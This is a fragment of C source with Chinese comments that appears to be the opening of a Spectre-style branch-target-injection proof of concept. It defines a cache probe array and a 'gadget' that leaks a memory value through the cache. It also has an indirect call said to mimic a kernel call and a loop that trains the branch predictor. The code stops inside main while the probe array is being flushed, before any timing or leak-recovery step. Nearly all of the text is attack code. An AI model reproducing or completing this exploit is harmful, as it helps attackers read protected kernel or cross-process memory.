#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <string.h>

// 探测数组
unsigned char probe[256 * 4096];

// 攻击者控制的gadget：读取一个内存地址并通过缓存泄露
__attribute__((noinline))
void gadget(uint64_t *addr) {
    volatile char tmp = probe[*addr * 4096];
}

// 受害者间接分支（模拟内核中的间接调用）
void victim_indirect(void (*func)(uint64_t*), uint64_t *arg) {
    // 间接调用
    func(arg);
}

// 训练BTB：多次调用间接分支，使其预测到gadget
void train_btb(void (*target)(uint64_t*), uint64_t *arg) {
    int i;
    for (i = 0; i < 100; i++) {
        victim_indirect(target, arg);
    }
}

int main() {
    // 初始化探测数组
    memset(probe, 1, sizeof(probe));
    // 清空探测数组缓存
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&probe[i * 4096]);
